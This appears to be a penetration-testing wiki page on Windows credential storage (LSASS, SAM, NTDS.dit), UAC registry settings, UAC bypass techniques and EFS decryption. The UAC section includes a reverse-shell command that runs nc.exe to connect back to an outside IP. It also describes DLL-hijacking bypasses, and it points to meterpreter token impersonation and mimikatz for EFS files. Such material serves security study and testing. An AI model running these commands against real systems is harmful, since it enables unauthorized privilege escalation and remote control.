# Authentication, Credentials, UAC and EFS

## Security Support Provider Interface \(SSPI\)

Is the API that can be use to authenticate users.

The SSPI will be in charge of finding the adequate protocol for two machines that want to communicate. The preferred method for this is Kerberos. Then the SSPI will negotiate which authentication protocol will be used, these authentication protocols are called Security Support Provider \(SSP\), are located inside each Windows machine in the form of a DLL and both machines must support the same to be able to communicate.

### Main SSPs

* **Kerberos**: The preferred one 
  * %windir%\Windows\System32\kerberos.dll
* **NTLMv1** and **NTLMv2**: Compatibility reasons 
  * %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Web servers and LDAP, password in form of a MD5 hash 
  * %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL and TLS 
  * %windir%\Windows\System32\Schannel.dll
* **Negotiate**: It is used to negotiate the protocol to use \(Kerberos or NTLM being Kerberos the default one\) 
  *  %windir%\Windows\System32\lsasrv.dll

#### The negotiation could offer several methods or only one.

## Local Security Authority \(LSA\)

The **credentials** \(hashed\) are **saved** in the **memory** of this subsystem for Single Sign-On reasons.  
**LSA** administrates the local **security policy** \(password policy, users permissions...\), **authentication**, **access tokens**...  
LSA will be the one that will **check** for provided credentials inside the **SAM** file \(for a local login\) and **talk** with the **domain controller** to authenticate a domain user.

The **credentials** are **saved** inside the **process** _**LSASS**_: Kerberos tickets, hashes NT and LM, easily decrypted passwords.

## Credentials Storage

### Security Accounts Manager \(SAM\)

Local credentials are present in this file, the passwords are hashed.

### LSASS

We have talk about this. Different credentials are saved in the memory of this process.

### LSA secrets

LSA could save in disk some credentials:

* Password of the computer account of the Active Directory \(unreachable domain controller\).
* Passwords of the accounts of Windows services
* Passwords for scheduled tasks
* More \(password of IIS applications...\)

### NTDS.dit

It is the database of the Active Directory. It is only present in Domain Controllers.

### Credential Manager store

Allows browsers and other Windows applications to save credentials.

## UAC

UAC is used to allow an **administrator user to not give administrator privileges to each process executed**. This is **achieved using default** the **low privileged token** of the user. When, the administrator executes some process **as administrator**, a **UAC elevation** is performed and if it is successfully completed, the privileged token is used to create the process.

To **differentiate** which process is executed with **low** or **high privileges** **Mandatory Integrity Controls** \(MIC\) are used. If you still don't know what are Windows Integrity levels check the following page:

{% page-ref page="windows-local-privilege-escalation/integrity-levels.md" %}

Some programs are **autoelevated automatically** if the **user belongs** to the **administrator group**. These binaries have inside their _**Manifests**_ the _**autoElevate**_ option with value _**True**_. The binary has to be **signed by Microsoft** also.

Then, to **bypass** the **UAC** \(elevate from **medium** integrity level **to high**\) some attackers use this kind of binaries to **execute arbitrary code** because it will be executed from a **High level integrity process**.

You can **check** the _**Manifest**_ of a binary using the tool _**sigcheck.exe**_ from Sysinternals. And you can **see** the **integrity level** of the processes using _Process Explorer_ or _Process Monitor_ \(of Sysinternals\).

### Check UAC

First you need to check the value of the key **EnableLUA**, if it's **`1`** then UAC is **activated**, if its **`0`** or it **doesn't exist**, then UAC is **inactive**.

```text
 reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ 
```

Then you have to check the value of the key **`ConsentPromptBehaviorAdmin`**in the same entry of the registry as before \(info from [here](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4)\):

* If **`0`** then, UAC won't prompt \(like **disabled**\)
* If **`1`** the admin is **asked for username and password** to execute the binary with high rights \(on Secure Desktop\)
* If **`2`** \(**Always notify me**\) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges \(on Secure Desktop\)
* If **`3`** like `1` but not necessary on Secure Desktop
* If **`4`** like `2` but not necessary on Secure Desktop
* if **`5`**\(**default**\) it will ask the administrator to confirm to run non Windows binaries with high privileges

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**   
If the value is **`0`**, then, only the **RID 500** user \(**built-in Administrator**\) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**  
If **`0`**\(default\), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Summary

* If **`EnableLUA=0`**or **doesn't exist**, **no UAC for anyone**
* If **`EnableLua=1`** and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
* If **`EnableLua=1`** and **`LocalAccountTokenFilterPolicy=0`** and **`FilterAdministratorToken=0`, No UAC for RID 500 \(Built-in Administrator\)**
* If **`EnableLua=1`** and **`LocalAccountTokenFilterPolicy=0`** and **`FilterAdministratorToken=1`, UAC for everyone**

### UAC bypass

{% hint style="info" %}
Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAS prompt appears
{% endhint %}

It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level \(Always\) than if it is in any of the other levels \(Default\).**

The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.  
All this information can be gathered using the metasploit module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:

```text
net user %username%
whoami /groups | findstr Level
```

#### **Very** Basic UAC "bypass" \(full file system access\)

If you have a shell with a user that is inside the Administrators group you can **mount the C$** shared via SMB \(file system\) local in a new disk and you will have **access to everything inside the file system** \(even Administrator home folder\).

{% hint style="info" %}
**Looks like this trick isn't working anymore**
{% endhint %}

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

#### UAC disabled

If UAC is already disabled \(**`ConsentPromptBehaviorAdmin`**is **`0`**\) you can **execute a reverse shell with admin privileges** \(high integrity level\) using something like:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass exploits

You could also use some tools to **bypass UAC like** [**UACME** ](https://github.com/hfiref0x/UACME)which is a **compilation** of several UAC bypass exploits. Note that you will need to **compile UACME using visual studio or msbuild**. The compilation will create several executables \(like_Source\Akagi\outout\x64\Debug\Akagi.exe_\) , you will need to know **which one you need.**  
You should **be careful** because some bypasses will **prompt some other programs** that will **alert** the **user** that something is happening.

**Empire** and **Metasploit** also have several modules to **bypass** the **UAC**. 

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim \(a common nc.exe shell is not enough\).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](../.gitbook/assets/image%20%2849%29.png)

\(_explorer.exe_ should works\)

### Your own bypass - Basic UAC bypass methodology

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y \(mainly writing the malicious dll on _C:\Windows\System32_\). [Read this to learn how to find a Dll Hijacking vulnerability](windows-local-privilege-escalation/dll-hijacking.md).

1. Find a binary that will **autoelevate** \(check that when it is executed it runs in a high integrity level\).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** \(like C:\Windows\System32\) were you don't have writing permissions. You can bypass this using:
   1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths \(because this tool is executed from a high integrity level\).
   2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

#### Another UAC bypass technique

Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** \(this is more interesting if the binary searches this information inside the **HKCU**\).

## EFS \(Encrypted File System\)

EFS works by encrypting a file with a bulk **symmetric key**, also known as the File Encryption Key, or **FEK**.  The FEK is then **encrypted** with a **public key** that is associated with the user who encrypted the file, and this encrypted FEK is stored in the $EFS **alternative data stream** of the encrypted file. To decrypt the file, the EFS component driver uses the **private key** that matches the EFS digital certificate \(used to encrypt the file\) to decrypt the symmetric key that is stored in the $EFS stream. From [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

Examples of files being decrypted without the user asking for it: 

* Files and folders are decrypted before being copied to a volume formatted with another file system, like [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table). 
* Encrypted files are copied over the network using the SMB/CIFS protocol, the files are decrypted before they are sent over the network.

The encrypted files using this method can be **tansparently access by the owner user** \(the one who has encrypted them\), so if you can **become that user** you can decrypt the files \(changing the password of the user and logins as him won't work\).

### Check EFS info

Check if a **user** has **used** this **service** checking if this path exists:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Check **who** has **access** to the file using cipher /c &lt;file&gt;  
You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files

### Decrypting EFS files 

#### Being Authority System

This way requires the **victim user** to be **running** a **process** inside the host. If that is the case, using a `meterpreter` sessions you can impersonate the token of the process of the user \(`impersonate_token` from `incognito`\). Or you could just `migrate` to process of the user.

#### Knowing the users password

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}



